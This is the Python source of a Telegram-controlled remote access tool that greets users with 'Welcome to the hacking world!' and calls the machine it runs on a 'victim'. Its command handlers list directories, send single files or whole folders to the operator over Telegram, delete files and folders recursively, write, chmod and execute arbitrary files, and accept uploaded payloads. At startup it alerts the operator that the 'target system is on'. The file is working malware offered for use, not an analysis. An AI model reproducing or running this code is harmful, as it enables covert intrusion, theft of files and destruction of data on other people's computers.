import telebot
import os
import shutil
from requests.exceptions import ConnectionError
import subprocess
import time



bot=telebot.TeleBot("")
chatids=["",""]
@bot.message_handler(commands=['start'])
def start(message):
    # global directory
    # directory=os.getcwd()
    bot.reply_to(message,"Welcome to the hacking world!")
    #Add chat id to which you wanna want to send info of users using your bot.....
    for i in chatids:
        bot.send_message(i,f'''
    ~~~User Arrived~~~ Be careful if he is unknown to you.... 
    ## User info:
    # User name=@{message.chat.username}
    # User id={message.chat.id}
    # User's first name={message.chat.first_name}''')
@bot.message_handler(commands=['pwd'])
def pwd(message):
    try:
        bot.reply_to(message,os.getcwd())
    except:
        bot.reply_to(message,"You are not in any directory.")

@bot.message_handler(commands=['cd'])
def chdir(message):
    bot.reply_to(message,"Enter your directory:")
    bot.register_next_step_handler(message,cd)
def cd(message):
    try:
        os.chdir(message.text)
        bot.send_message(message.chat.id,f"Directory changed to {os.getcwd()}")
    except:
        bot.reply_to(message,"No such directory found.")
@bot.message_handler(commands=['ls'])
def ls(message):
    bot.reply_to(message,f"Getting access to {os.getcwd()}.Please wait.....")
    try:
        list=os.listdir(os.getcwd())

        for i in list:
            if os.path.isdir(f"{os.getcwd()}/{i}"):   
                bot.send_message(message.chat.id,f"dir--{i}")
            else:
                bot.send_message(message.chat.id,i)
        bot.reply_to(message,"These are the all files and folders found in target dir.Wanna fetch one file(/file) or all files of a dir(/files) or delete some folder(/rmr) or file:(/rm)?")
    except:
        bot.reply_to(message,"Please enter valid victim folder's path.")

@bot.message_handler(commands=['file'])
def file(message):
    bot.reply_to(message,f"Enter the file name of {os.getcwd()}:")
    bot.register_next_step_handler(message,filefetch)
def filefetch(message):
    bot.reply_to(message,"Fetching...Please wait......")
    try: 
        with open(f"{os.getcwd()}/{message.text}","rb") as f:
            bot.send_document(message.chat.id,f)
        bot.reply_to(message,"File successfully fetched.")
    except:
        bot.reply_to(message,"File doesn't exist or couldn't be fetched.")


@bot.message_handler(commands=['files'])
def files(message):
    bot.reply_to(message,f"Enter the directory name of {os.getcwd()}:")
    bot.register_next_step_handler(message,filesfetch)
def filesfetch(message):
    bot.reply_to(message,"Fetching files...Please wait......")
    try:
        for i in os.listdir(f"{os.getcwd()}/{message.text}"):
            with open(f"{os.getcwd()}/{message.text}/{i}","rb") as f:
                bot.send_document(message.chat.id,f)
        bot.reply_to(message,f"Files of {message.text} successfully fetched.")
    except:
        bot.reply_to(message,"Dir doesn't exist or couldn't be fetched or may be somefiles couldn't be fetched. If you faced problems in /files command please use /file command to fetch each file individually.")

@bot.message_handler(commands=['rmr'])
def deleteFolder(message):
    bot.reply_to(message,f"Please enter name of directory of {os.getcwd()}....")
    bot.register_next_step_handler(message,rmr)
def rmr(message):
    try:
        shutil.rmtree(f"{os.getcwd()}/{message.text}")
        bot.reply_to(message,f"{message.text} successfully gone.Check it by checking path: /check_path")
    except:
        bot.reply_to(message,"Folder doesn't exists or inaccessible.")
@bot.message_handler(commands=['rm'])
def deleteFile(message):
    bot.reply_to(message,f"Please enter the name of the file of {os.getcwd()}....")
    bot.register_next_step_handler(message,rm)
def rm(message):
    try:
        os.remove(f"{os.getcwd()}/{message.text}")
        bot.reply_to(message,f"{message.text} successfully gone.Check it by checking path: /check_path")
    except:
        bot.reply_to(message,"File doesn't exists or inaccessible.")
@bot.message_handler(commands=['check_path'])
def checkpath(message):
    bot.reply_to(message,"Enter your full path: ")
    bot.register_next_step_handler(message,check)
def check(message):
    try:
        if os.path.exists(message.text):
            bot.reply_to(message,f"Yes {message.text} exists. ")
        else:
            bot.reply_to(message,f"No.{message.text} doesn't exits on victim system.")
    except:
        bot.reply_to(message,"Please provide valid path.")

@bot.message_handler(commands=['vim'])
def create(message):
    bot.reply_to(message,"Enter the name of your file:")
    bot.register_next_step_handler(message,vim)
def vim(message):
    try:
        global filename
        filename=f"{os.getcwd()}/{message.text}"
        with open(f"{os.getcwd()}/{message.text}","w") as f:
            f.writelines("Null")
        bot.reply_to(message,"Enter content:")
        bot.register_next_step_handler(message,write)
        
            
    except:
        bot.reply_to(message,"Some error occured...please try again /vim")


def write(message):
    try:
        with open(filename,"w") as f:
            f.write(message.text)
        bot.reply_to(message,"File created to target side successfully.")
        bot.send_message(message.chat.id,"Want to execute?(/execute)")
    except:
        bot.reply_to(message,"File Creation Unsuccessful.....")
print("Bot Started.....")

@bot.message_handler(commands=['execute'])
def exec(message):
    bot.reply_to(message,f"Enter your executable file name of {os.getcwd()}")
    bot.register_next_step_handler(message,execute)
def execute(message):
    try:
        if os.path.exists(f"{os.getcwd()}/{message.text}"):
            os.system(f"{os.getcwd()}/{message.text}")
            # subprocess.run([f"{os.getcwd()}/{message.text}"], shell=True)
            bot.reply_to(message,"Execution successful.")
        else:
            bot.reply_to(message,"File doesn't exists")
    except:
        bot.reply_to(message,"Execution Unsuccessful")

@bot.message_handler(commands=['chmod'])
def changemod(message):
    bot.reply_to(message,f"Enter the permission and name of file of {os.getcwd()} (example:755 main.sh)")
    bot.register_next_step_handler(message,chmod)
def chmod(message):
    list=message.text.split(" ")
    file_path=f"{os.getcwd()}/"+list[1]
    permission=int(list[0],8)
    # print(list)
    try:
        os.chmod(file_path, permission)
        bot.reply_to(message,"Permission Updated....")
    except:
        bot.reply_to(message,"Permission can't be changed.")

@bot.message_handler(commands=['cat'])
def concatinate(message):
    bot.reply_to(message,"Enter your file name:")
    bot.register_next_step_handler(message,cat)
def cat(message):
    try:
        with open(f"{os.getcwd()}/{message.text}","r") as f:
            content=f.read()
        bot.send_message(message.chat.id,f'''
File content:
{content}''')
    except:
        bot.repyl_to(message,"file is inaccessible.")

@bot.message_handler(commands=['mkdir'])
def makedir(message):
    bot.reply_to(message,f"Enter the directory name you want to creat in {os.getcwd()}")
    bot.register_next_step_handler(message,mkdir)
def mkdir(message):
    try:
        os.mkdir(f"{os.getcwd()}/{message.text}")
        bot.send_message(message.chat.id,f"Directory {os.getcwd()}/{message.text} is created successfully")
    except:
        bot.reply_to(message,"Directory couldn't be created......")

@bot.message_handler(content_types=['document'])
def handle_docs_photos(message):
    bot.reply_to(message,"Uploading........") 
    try:
        # For documents
        
        
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        # global original_file_name
        original_file_name = message.document.file_name
        with open(f"{os.getcwd()}/{original_file_name}", 'wb') as new_file:
            new_file.write(downloaded_file)
        
        bot.reply_to(message,"Upload Completed.")  
    except:
        bot.reply_to(message,"It seems this is not a document.....")


#Add below the chatid's to which you wanna forward alart when victic is online.
for j in chatids:
    bot.send_message(j,"Target system is on......")
while True:
    try:
        bot.polling(none_stop=True)
    except ConnectionError as e:
        print(f"Connection error: {e}. Retrying...")
        # Implement your retry logic here or just pass to retry on the next loop iteration
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
# bot.polling()
